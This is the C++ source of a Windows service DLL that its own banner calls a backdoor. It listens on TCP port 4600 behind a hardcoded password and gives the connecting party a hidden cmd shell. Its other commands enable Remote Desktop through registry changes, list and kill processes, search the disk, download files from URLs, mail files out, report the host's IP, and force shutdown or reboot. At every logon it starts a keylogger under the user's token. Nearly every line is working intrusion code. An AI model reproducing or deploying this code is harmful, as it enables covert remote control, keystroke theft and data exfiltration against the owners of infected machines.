// dllmain.cpp : ���� DLL Ӧ�ó������ڵ㡣
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h> 
#include <winsock2.h>
#include <tlhelp32.h>
#include <urlmon.h>
#include <Userenv.h>
#pragma comment(lib, "Userenv.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "ws2_32.lib")

#include "mail.h"


/*


*/
//SERVICE_STATUS        ServiceStatus;
//SERVICE_STATUS_HANDLE ServiceStatusHandle;
DWORD g_dwServiceType;
SERVICE_STATUS_HANDLE g_hServiceStatus;
DWORD g_dwCurrState;
int TellSCM(DWORD dwState, DWORD dwExitCode, DWORD dwProgress)
{
	SERVICE_STATUS srvStatus;
	srvStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
	srvStatus.dwCurrentState = g_dwCurrState = dwState;
	srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN| SERVICE_ACCEPT_SESSIONCHANGE;
	srvStatus.dwWin32ExitCode = dwExitCode;
	srvStatus.dwServiceSpecificExitCode = 0;
	srvStatus.dwCheckPoint = dwProgress;
	srvStatus.dwWaitHint = 1000;
	return SetServiceStatus(g_hServiceStatus, &srvStatus);
}
struct DirList {
	char table[256];
	DirList *pNext;
};

DirList *first, *newlist, *last;

//�����ļ�������
void AddList(char *list)
{
	newlist = new DirList;
	strcpy(newlist->table, list);
	newlist->pNext = NULL;
	//�����ļ�����Ϊ�գ���ô��һ�������һ���ڵ㶼ָ���½ڵ�
	if (first == NULL)
	{
		first = newlist;
		last = newlist;
	}
	//��Ϊ�գ���ԭ�����һ���ڵ�ָ���½ڵ�
	else
	{
		last->pNext = newlist;
		last = newlist;
	}
}

//�����ļ��������ҵ����ļ��м����ļ�������
void FindFile(SOCKET s, char *pRoad, char *pFile)
{
	char FileRoad[256] = { 0 };
	char DirRoad[256] = { 0 };
	char FindedFile[256] = { 0 };
	char FindedDir[256] = { 0 };
	strcpy(FileRoad, pRoad);
	strcpy(DirRoad, pRoad);
	strcat(DirRoad, "\\*.*");
	WIN32_FIND_DATA findData;
	HANDLE hFindFile;
	hFindFile = FindFirstFile(DirRoad, &findData);
	if (hFindFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			if (findData.cFileName[0] == '.')
				continue;
			//�������ļ��У�������ļ����б�
			if (findData.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)
			{
				strcpy(FindedDir, pRoad);
				strcat(FindedDir, "\\");
				strcat(FindedDir, findData.cFileName);
				//�����ļ����б�
				AddList(FindedDir);
				memset(FindedDir, 0x00, 256);
			}
			//��������
		} while (FindNextFile(hFindFile, &findData));
	}
	strcat(FileRoad, "\\");
	strcat(FileRoad, pFile);
	//����Ҫ���ҵ��ļ�
	hFindFile = FindFirstFile(FileRoad, &findData);
	if (hFindFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			strcpy(FindedFile, pRoad);
			strcat(FindedFile, "\\");
			strcat(FindedFile, findData.cFileName);
			strcat(FindedFile, "\r\n");
			//������ҵ����ļ�
			send(s, FindedFile, strlen(FindedFile), 0);
			memset(FindedFile, 0x00, 256);
		} while (FindNextFile(hFindFile, &findData));
	}
}

int SeachFile(SOCKET s, char *Directory, char *SeachFile)
{
	DirList NewList;
	strcpy(NewList.table, Directory);
	NewList.pNext = NULL;
	//��ʼ����һ�������һ���ڵ�
	last = &NewList;
	first = &NewList;
	while (true)
	{
		DirList *Find;
		//��������Ϊ�գ���ȡ�����еĵ�һ���ڵ㣬���ѵ�һ���ڵ�ָ��ԭ���ڶ���
		if (first != NULL)
		{
			Find = first;
			first = first->pNext;
			FindFile(s, Find->table, SeachFile);
		}
		//Ϊ����ֹͣ����
		else
		{
			send(s, "\r\n�ļ��������\r\n", strlen("\r\n�ļ��������\r\n"), 0);
			return 0;
		}
	}
	return 0;
}

//�����޸��ַ����ͼ�ֵ
void CreateStringReg(HKEY hRoot, char *szSubKey, char* ValueName, char *Data)
{
	HKEY hKey;
	//��ע�������������򴴽���
	long lRet = RegCreateKeyEx(hRoot, szSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
	if (lRet != ERROR_SUCCESS)
	{
		printf("error no RegCreateKeyEx %s\n", szSubKey);
		return;
	}
	//�޸�ע����ֵ��û���򴴽���
	lRet = RegSetValueEx(hKey, ValueName, 0, REG_SZ, (BYTE*)Data, strlen(Data));
	if (lRet != ERROR_SUCCESS)
	{
		printf("error no RegSetValueEx %s\n", ValueName);
		return;
	}
	RegCloseKey(hKey);
}

//�����޸��������ͼ�ֵ
void CreateDWORDReg(HKEY hRoot, char *szSubKey, char* ValueName, DWORD Data)
{
	HKEY hKey;
	//��ע�������������򴴽���
	long lRet = RegCreateKeyEx(hRoot, szSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
	if (lRet != ERROR_SUCCESS)
	{
		printf("error no RegCreateKeyEx %s\n", szSubKey);
		return;
	}
	DWORD dwSize = sizeof(DWORD);
	//�޸�ע����ֵ��û���򴴽���
	lRet = RegSetValueEx(hKey, ValueName, 0, REG_DWORD, (BYTE*)&Data, dwSize);
	if (lRet != ERROR_SUCCESS)
	{
		printf("error no RegSetValueEx %s\n", ValueName);
		return;
	}
	RegCloseKey(hKey);
}

//�ػ�
void ShutDown()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	//������ǰ��������
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return;
	//��ȡ�������ձ�ʾ�������ض���ϵͳ������Ȩ��
	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	//������������Ȩ��
	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
	//�ػ���Ҫʵ������ֻ�轫��һ����������EWX_REBOOT|EWX_FORCE
	//ע����һ����������EWX_LOGOFF|EWX_FORCE
	ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, 0);

}

//ע��
void LogOff()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return;
	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
	ExitWindowsEx(EWX_LOGOFF | EWX_FORCE, 0);

}

//����
void Reboot()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return;
	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);

}

//cmdshell�̺߳���
DWORD WINAPI CmdThread(LPVOID lpParam)
{
	SOCKET s = (SOCKET)lpParam;
	STARTUPINFO si;
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	//ʹcmd���������ֱ�Ӻ�socket����
	si.hStdInput = si.hStdOutput = si.hStdError = (void*)s;
	char cmdline[256];
	//�õ�cmd·��
	GetSystemDirectory(cmdline, sizeof(cmdline));
	strcat(cmdline, "\\cmd.exe");
	PROCESS_INFORMATION ProcessInformation;
	int ret;
	//����cmd����
	ret = CreateProcess(NULL, cmdline, NULL, NULL, 1, 0, NULL, NULL, &si, &ProcessInformation);
	//�ȴ����̽���
	WaitForSingleObject(ProcessInformation.hProcess, INFINITE);
	CloseHandle(ProcessInformation.hProcess);
	return 0;
}

//����3389
int Open3389(SOCKET s, DWORD Port)
{
	CreateStringReg(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\netcache", "Enabled", "0");
	CreateDWORDReg(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer", "EnableAdminTSRemote", 0x00000001);
	CreateStringReg(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "ShutdownWithoutLogon", "0");
	CreateDWORDReg(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server", "TSEnabled", 0x00000001);
	CreateDWORDReg(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\TermDD", "Start", 0x00000002);
	CreateDWORDReg(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\TermService", "Start", 0x00000002);
	CreateDWORDReg(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server", "fDenyTSConnections", 0x00000001);
	CreateDWORDReg(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\RDPTcp", "PortNumber", Port);
	CreateDWORDReg(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", "PortNumber", Port);
	CreateDWORDReg(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp", "PortNumber", Port);
	CreateStringReg(HKEY_USERS, ".DEFAULT\\Keyboard Layout\\Toggle", "Hotkey", "2");
	CreateDWORDReg(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server", "fDenyTSConnections", 0x00000000);
	OSVERSIONINFO osver = { sizeof(OSVERSIONINFO) };
	GetVersionEx(&osver);
	//�ж��ǲ���windows 2000��������
	if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 0)
	{
		send(s, "\r\n�������������\r\n", sizeof("\r\n�������������\r\n"), 0);
		Reboot();
	}
	send(s, "\r\nԶ���ն˿����ɹ�\r\n", sizeof("\r\nԶ���ն˿����ɹ�\r\n"), 0);
	return 0;

}

//�оٽ���
int GetProcess(SOCKET s)
{
	char buff[1024] = { 0 };
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(pe32);
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		printf("CreateToolhelp32Snapshot failed");
		return 0;
	}
	//ѭ���оٽ���
	BOOL bMore = Process32First(hProcessSnap, &pe32);
	while (bMore)
	{
		wsprintf(buff, "%s---------------%d\r\n", pe32.szExeFile, pe32.th32ProcessID);
		send(s, buff, strlen(buff), 0);
		memset(buff, 0x00, 1024);
		bMore = Process32Next(hProcessSnap, &pe32);
	}
	CloseHandle(hProcessSnap);
	return 0;
}

//��������
int KillProcess(SOCKET s, DWORD Pid)
{
	char sendData[80];
	//�򿪽��̵õ����̾��
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);
	if (hProcess == NULL)
	{
		strcpy(sendData, "\r\n��������ʧ��\r\n");
		send(s, sendData, strlen(sendData), 0);
		return 0;
	}
	//��������
	if (TerminateProcess(hProcess, 0))
	{
		strcpy(sendData, "\r\n�������̳ɹ�\r\n");
		send(s, sendData, strlen(sendData), 0);
		return 0;
	}
	else
	{
		strcpy(sendData, "\r\n��������ʧ��\r\n");
		send(s, sendData, strlen(sendData), 0);
		return 0;
	}
}

//�ж��ļ��Ƿ����
BOOL FileExists(LPCTSTR lpszFileName)
{
	//�õ��ļ�����
	DWORD dwAttributes = GetFileAttributes(lpszFileName);
	//�������óɹ����ļ�����
	if (dwAttributes == 0xffffffff)
	{
		return false;
	}
	//�����ļ�������
	else
	{
		return true;
	}
}

//http�����ļ�
void download(SOCKET s, char *Url, char *FilePath)
{
	if (FileExists(FilePath))
	{
		//ɾ�������ļ�
		if (!DeleteFile(FilePath))
		{
			send(s, "\r\n�ļ��Ѵ��ڣ������޷�ɾ��\r\n", strlen("\r\n�ļ��Ѵ��ڣ������޷�ɾ��\r\n"), 0);
			return;
		}
	}
	//�����ļ�
	URLDownloadToFile(0, Url, FilePath, 0, 0);
	//�ж��ļ��治���ڣ���ȷ�����س������
	if (FileExists(FilePath))
	{
		send(s, "\r\n�ļ����سɹ�\r\n", strlen("\r\n�ļ����سɹ�\r\n"), 0);
	}
	else
	{
		send(s, "\r\n�ļ�����ʧ��\r\n", strlen("\r\n�ļ�����ʧ��\r\n"), 0);
	}
}

BOOL ReadFile(char *name, int &ifEmail, int &ifkeyboard)
{
	SetFileAttributes("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\conf.al", FILE_ATTRIBUTE_NORMAL);
	FILE *fpTable;
	//fpTable = fopen("D:\\conf.txt", "r+");
	fpTable = fopen("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\conf.al", "r+");	
	/*���������ʱ�����������������Ϣ,�����������*/
	if (fpTable == NULL)
	{
		return FALSE;
	}

	//fprintf(fpTable, "%s%ld%f%c", "a-string", 65000, 3.14159, 'x');
	/*��ָ���������ļ���ͷ*/
	/*���ļ��ж�ȡ����*/
	fscanf(fpTable, "%s %d %d", name, &ifEmail, &ifkeyboard); 
	SetFileAttributes("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\conf.al", FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
	fclose(fpTable);
	return TRUE;
}
BOOL WriteFile(char *name, int ifEmail, int ifkeyboard)
{
	SetFileAttributes("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\conf.al", FILE_ATTRIBUTE_NORMAL);
	if (GetLastError() == 3)
	{
		CreateDirectory("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}", NULL);
		SetFileAttributes("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\conf.al", FILE_ATTRIBUTE_NORMAL);
	}
	FILE *fpTable; 
	fpTable = fopen("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\conf.al", "w+");

	//fpTable = fopen("D:\\conf.txt", "w+");
	if (fpTable == NULL)
	{
		return FALSE;
	}

	fprintf(fpTable, "%s %d %d", name, ifEmail, ifkeyboard);
	fclose(fpTable);
	SetFileAttributes("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\conf.al", FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
	return TRUE;
}
DWORD WINAPI DoorThread(LPVOID lpParam)
{

	SOCKET s = (SOCKET)lpParam;
	send(s, "door>", sizeof("door>"), 0);
	char buff[1024] = { 0 };
	char DoorData[1024] = { 0 };
	int ret;

	while (true)
	{
		while (true)
		{
			//ÿ�ν���һ���ַ�
			if (ret = recv(s, buff, 1, 0) == SOCKET_ERROR)
			{
				closesocket(s);
				return 0;
			}
			//�����ǻس�������ѭ��
			if (buff[0] == 0xa)
			{
				break;
			}
			//���粻�ǻس��Ͱ��ַ��ۼӸ�DoorData
			if (buff[0] != 0xa && buff[0] != 0xd)
				strcat(DoorData, buff);

		}
		//����cmdshell
		if (strncmp(DoorData, "cmdshell", 8) == 0)
		{
			DWORD dwThreadId;
			HANDLE hThread;
			hThread = CreateThread(NULL, NULL, CmdThread, (LPVOID)s, 0, &dwThreadId);
			WaitForSingleObject(hThread, INFINITE);
		}
		//����Զ���ն�
		else if (strncmp(DoorData, "open", 4) == 0)
		{
			char *port = DoorData;
			port = port + 5;
			DWORD T_Port = atoi(port);
			Open3389(s, T_Port);
		}
		//��ȡ�����б�
		else if (strncmp(DoorData, "plist", 5) == 0)
		{
			GetProcess(s);
		}
		//��������
		else if (strncmp(DoorData, "pkill", 5) == 0)
		{
			char *Pid = DoorData;
			Pid = Pid + 6;
			DWORD P_id = atoi(Pid);
			KillProcess(s, P_id);
		}
		//�����ļ�
		else if (strncmp(DoorData, "seach", 5) == 0)
		{
			if (strlen(DoorData)>9)
			{
				char *AllData = DoorData;
				AllData = AllData + 6;
				char PartData[256];
				strcpy(PartData, AllData);
				char *FileName = strstr(PartData, " ");
				if (FileName != NULL)
				{
					FileName = FileName + 1;
					char *SeachFiles = FileName;
					FileName = FileName - 1;
					*FileName = NULL;
					SeachFile(s, PartData, SeachFiles);
				}
			}

		}
		//http�����ļ�
		else if (strncmp(DoorData, "down", 4) == 0)
		{
			if (strlen(DoorData)>20)
			{
				char *DownData = DoorData;
				DownData = DownData + 5;
				char Url[256];
				strcpy(Url, DownData);
				char *Path = strstr(Url, " ");
				if (Path != NULL)
				{
					Path = Path + 1;
					char *FilePath = Path;
					Path = Path - 1;
					*Path = NULL;
					download(s, Url, FilePath);
				}
			}
		}
		//����
		else if (strncmp(DoorData, "reboot", 6) == 0)
		{
			Reboot();
		}
		//�ػ�
		else if (strncmp(DoorData, "shutdown", 8) == 0)
		{
			ShutDown();
		}
		//ע��
		else if (strncmp(DoorData, "logoff", 6) == 0)
		{
			LogOff();
		}
		//����
		else if (strncmp(DoorData, "help", 4) == 0)
		{
			char HelpData[1024] = "help  --����\r\nopen port  --����Զ���ն�\r\ncmdshell  --����cmdshell\r\nseach path filename  --�����ļ�\r\ndown httpurl filepath  --http�����ļ�\r\nreboot  --���������\r\nshutdown  --�رռ����\r\nlogoff  --ע���û�\r\nplist --��ʾ����\r\npkill --ɱ������\r\nexit  --�˳�cmdshell\r\nccfg [name][0/1][0/1]  --[name]���ú������� [0/1]ifMail [0/1]ifKeyboard\r\nscfg  --��ʾ������Ϣ\r\nquit  --�˳����ų���\r\nmail [URL]  --���ļ�����������\r\n";
			send(s, HelpData, strlen(HelpData), 0);
		}
		else if (strncmp(DoorData, "mail", 4) == 0)
		{
			char *DownData = DoorData;
			DownData = DownData + 5;
			char Url[256], NameData[256];
			int a, b;
			strcpy(Url, DownData);
			if (ReadFile(NameData, a, b) == TRUE)
			{
				if (SendAttachFile(NameData, Url) == TRUE)
				{
					send(s, "SendOut\n\r", strlen("SendOut\n\r"), 0);
				}
				else
				{
					send(s, "SendFail\n\r", strlen("SendOut\n\r"), 0);
				}
			}
			else
			{
				strcpy(NameData, "Unknown");
				if (SendAttachFile(NameData, Url) == TRUE)
				{
					send(s, "SendOut CFG disappear\n\r", strlen("SendOut CFG disappear\n\r"), 0);
				}
				else
				{
					send(s, "SendFail CFG disappear\n\r", strlen("SendOut CFG disappear\n\r"), 0);
				}
			}


		}
		else if (strncmp(DoorData, "ccfg", 4) == 0)
		{
			char *pCfgData = DoorData;
			pCfgData = pCfgData + 5;
			char temp[256];
			strcpy(temp, pCfgData);
			char NameData[256];
			int ifEmail, ifKeyboard;
			sscanf(temp, "%s %d %d", NameData, &ifEmail, &ifKeyboard);
			if (WriteFile(NameData, ifEmail, ifKeyboard) == TRUE)
			{
				send(s, "Success\n\r", strlen("Success\n\r"), 0);
			}
			else
			{
				send(s, "Fail\n\r", strlen("Fail\n\r"), 0);
			}
		}
		else if (strncmp(DoorData, "scfg", 4) == 0)
		{

			char NameData[256], buf[512], mail[5], keyboard[5];
			int ifEmail, ifKeyboard;

			if (ReadFile(NameData, ifEmail, ifKeyboard) == TRUE)
			{
				if (ifEmail)
				{
					strcpy(mail, "yes");
				}
				else
				{
					strcpy(mail, "no");
				}
				if (ifKeyboard)
				{
					strcpy(keyboard, "yes");
				}
				else
				{
					strcpy(keyboard, "no");
				}

				sprintf(buf, "\n\rname:%s\n\remail:%s\n\rkeyboard:%s\n\r", NameData, mail, keyboard);
				send(s, buf, strlen(buf), 0);
			}
			else
			{
				send(s, "Fail\n\r", strlen("Fail\n\r"), 0);
			}
		}
		//�˳�����
		else if (strncmp(DoorData, "quit", 4) == 0)
		{
			closesocket(s);
			return 0;
		}
		else if (strlen(DoorData))
		{
			wsprintf(DoorData, "%s is not a command\r\n", DoorData);
			send(s, DoorData, strlen(DoorData), 0);
		}
		if (buff[0] == 0xa)
			send(s, "door>", sizeof("door>"), 0);
		memset(DoorData, 0, 1024);
	}
	return 0;
}
typedef BOOL(*StartHook)();
typedef BOOL(*StopHook)();
BOOL   GetTokenByName(HANDLE   &hToken, LPSTR   lpName)
{
	if (!lpName)
	{
		return   FALSE;
	}
	HANDLE                   hProcessSnap = NULL;
	BOOL                       bRet = FALSE;
	PROCESSENTRY32   pe32 = { 0 };

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
		return   (FALSE);

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hProcessSnap, &pe32))
	{
		do
		{
			if (!strcmp(_strupr(pe32.szExeFile), _strupr(lpName)))
			{
				HANDLE   hProcess =
					OpenProcess(PROCESS_QUERY_INFORMATION,
						FALSE, pe32.th32ProcessID);
				bRet = OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken);
				CloseHandle(hProcessSnap);
				return   (bRet);
			}
		} while (Process32Next(hProcessSnap, &pe32));
		bRet = TRUE;
	}
	else
		bRet = FALSE;

	CloseHandle(hProcessSnap);
	return   (bRet);
}

BOOL   RunProcess(LPCSTR   lpImage)
{
	if (!lpImage)
	{
		return   FALSE;
	}
	HANDLE   hToken;
	if (!GetTokenByName(hToken, "EXPLORER.EXE"))
	{
		return   FALSE;
	}
	STARTUPINFO   si;
	PROCESS_INFORMATION   pi;

	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	si.lpDesktop = TEXT("winsta0\\default");

	BOOL   bResult =
		CreateProcessAsUser(hToken, lpImage, NULL, NULL, NULL,
			FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
	CloseHandle(hToken);
	if (bResult)
	{
		//DataToFile("CreateProcessAsUser   ok!\r\n");
	}
	else
	{
		//DataToFile("CreateProcessAsUser   false!\r\n");
	}
	return   bResult;
}
void MailService()
{
	char name[256];
	int ifEmail, ifKey;
	if (ReadFile(name, ifEmail, ifKey) == FALSE)
	{
		char szCommandLine[MAX_PATH];
		GetSystemDirectory(szCommandLine, MAX_PATH);
		strcat(szCommandLine, "\\mestr.exe");//this is setkeyhook.exe
											 //strcpy(szCommandLine, "D:\\visual Studio project\\setkeyhook\\Release\\setkeyhook.exe");
		RunProcess(szCommandLine);
		strcpy(name, "lucy");
		ifEmail = 1;
	}
	if (ifEmail == 1)
	{
		while (SendIpInformation(name) == FALSE)
		{
			Sleep(1000);
		}
	}
}
DWORD WINAPI CmdService(LPVOID lpParam)
{
	char wMessage[512] = "========================  BackDoor by ybbbby  ========================\r\n";
	//����socket����
	SOCKET sClient[500];
	//��ʼ��socket�����Ҽ����˿�
	WSADATA wsaData;
	WORD sockVersion = MAKEWORD(2, 2);
	if (WSAStartup(sockVersion, &wsaData) != 0)
		return 0;
	SOCKET sListen = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	if (sListen == INVALID_SOCKET)
	{
		printf("socket error \n");
		return 0;
	}
	//����socket����
	sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(4600);
	sin.sin_addr.S_un.S_addr = INADDR_ANY;

	if (bind(sListen, (LPSOCKADDR)&sin, sizeof(sin)) == SOCKET_ERROR)
	{
		printf("bind error \n");
		return 0;
	}
	//�����˿ڣ�����5��ʾ���ֻ�ܽ����������
	if (listen(sListen, 5) == SOCKET_ERROR)
	{
		printf("listen error \n");
		return 0;
	}
	DWORD dwThreadId;
	char buff[1024] = { 0 };
	char PassWord[1024] = { 0 };
	int ret;
	//ѭ�������ڽ������ӣ������ѭ��������ǰ��listen�����еĵڶ�������Ҫһ�£�
	//��Ϊֻ�ܽ���5�����ӣ�ѭ��һ�ν���һ�����ӣ�����ֻ��ѭ��5��
	for (int i = 0; i<500; i++)
	{
		//��������
		sClient[i] = accept(sListen, NULL, NULL);
		send(sClient[i], "PassWord:\r\n", strlen("PassWord:\r\n"), 0);
		while (true)
		{
			//ÿ�ν���һ���ַ�
			if (ret = recv(sClient[i], buff, 1, 0) == SOCKET_ERROR)
			{
				//closesocket(sClient[i]);   //�������֣������ɾȥ�Ļ����ͻ���ɷ�����Զ��˳�
				break;
			}
			//�յ��س���������ѭ��
			if (buff[0] == 0xa)
			{
				break;
			}
			//���˻س���
			if (buff[0] != 0xa && buff[0] != 0xd)
				strcat(PassWord, buff);
		}
		//����������ȷ�򴴽������߳�
		if (strcmp(PassWord, "ybbbby") == 0)
		{
			//���������߳�
			CreateThread(NULL, NULL, DoorThread, (LPVOID)sClient[i], 0, &dwThreadId);
			//���ͻ�ӭ��Ϣ
			send(sClient[i], wMessage, strlen(wMessage), 0);
		}
		//���������Ͽ�����
		else
		{
			memset(PassWord, 0, sizeof(PassWord));
			send(sClient[i], "\r\n�������\r\n", strlen("\r\n�������\r\n"), 0);
			closesocket(sClient[i]);
		}
	}
	return 0;
}


//������ƺ���
DWORD WINAPI ServiceControl(
	_In_ DWORD  dwControl,
	_In_ DWORD  dwEventType,
	_In_ LPVOID lpEventData,
	_In_ LPVOID lpContext
)
{
	
	switch (dwControl)
	{
		
	case SERVICE_CONTROL_STOP:
		TellSCM(SERVICE_STOP_PENDING, 0, 1);
		Sleep(10);
		TellSCM(SERVICE_STOPPED, 0, 0);
		break;
	case SERVICE_CONTROL_PAUSE:
		TellSCM(SERVICE_PAUSE_PENDING, 0, 1);
		TellSCM(SERVICE_PAUSED, 0, 0);
		break;
	case SERVICE_CONTROL_CONTINUE:
		TellSCM(SERVICE_CONTINUE_PENDING, 0, 1);
		TellSCM(SERVICE_RUNNING, 0, 0);
		break;
	case SERVICE_CONTROL_INTERROGATE:
		TellSCM(g_dwCurrState, 0, 0);
		break; 
	case SERVICE_CONTROL_SESSIONCHANGE:
		switch (dwEventType)
		{
		case WTS_SESSION_LOGOFF:
			break;
		case WTS_SESSION_LOGON:
			char szCommandLine[MAX_PATH];
			GetSystemDirectory(szCommandLine, MAX_PATH);
			strcat(szCommandLine, "\\mestr.exe");//this is setkeyhook.exe
			//strcpy(szCommandLine, "D:\\visual Studio project\\setkeyhook\\Release\\setkeyhook.exe");
			Sleep(60000);
			RunProcess(szCommandLine);
			break;
		case WTS_SESSION_LOCK:
			break;
		case WTS_SESSION_UNLOCK:
			break;
		default:
			break;
		}
	}
	return NO_ERROR;
}

//������
void __stdcall ServiceMain(int argc, wchar_t* argv[])
{
	HANDLE    hThread;
	char szSvcName[MAX_PATH];
	wcstombs(szSvcName, argv[0], sizeof szSvcName);

	// ע��һ��������Ƴ���
	g_hServiceStatus = RegisterServiceCtrlHandlerEx(szSvcName, (LPHANDLER_FUNCTION_EX)ServiceControl,NULL);
	if (g_hServiceStatus == NULL)
	{
		return;
	}
	else FreeConsole();

	TellSCM(SERVICE_START_PENDING, 0, 1); // ֪ͨ������ƹ������÷���ʼ
	TellSCM(SERVICE_RUNNING, 0, 0);  // ֪ͨ������ƹ������÷�������
									 //���������߳�
	hThread = CreateThread(NULL, 0, CmdService, NULL, 0, NULL);
	MailService();
	//char szCommandLine[] = "D:\\visual Studio project\\setkeyhook\\Release\\setkeyhook.exe"; 
	
	
	//WinExec(szCommandLine, SW_HIDE);
	if (hThread == NULL )
	{
		
	}
	do {
		Sleep(100);
	} while (g_dwCurrState != SERVICE_STOP_PENDING && g_dwCurrState != SERVICE_STOPPED);
	return;
}


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_DETACH:
	{
		ServiceControl(SERVICE_CONTROL_STOP, 0, NULL, NULL);
		break;
	}
	default:
		break;
	}
	return TRUE;
}

